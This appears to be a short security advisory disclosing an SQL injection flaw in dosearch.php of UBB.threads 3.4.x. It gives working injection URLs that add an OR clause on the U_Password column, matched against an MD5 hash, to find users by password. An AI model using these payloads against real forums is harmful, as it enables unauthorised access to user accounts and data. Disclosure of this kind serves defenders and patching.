Subject: SQL Injection in UBB.threads 3.4.x


Product:
========
UBB.threads

Vendor:
=======
UBBCentral (http://www.ubbcentral.com/)

Versions:
=========
I tested it successfull on 3.4.x
At Version 3.5 you need to be logged in to perform a search. I didnt tested 
this version.

Problem:
========
Sql-Injection in dosearch.php
dosearch.php?Name=' OR U_Password='PWINMD5

Impact:
=======
A remote user can inject SQL commands

Example:
========
db5c82346d770f48bdd8929094c0c695 (ubbpass)

/dosearch.php?Name=' OR U_Password='db5c82346d770f48bdd8929094c0c695
OR
/dosearch.php?Name=' OR U_Password='db5c82346d770f48bdd8929094c0c695'/*
-> selects a user who got "ubbpass" as password.
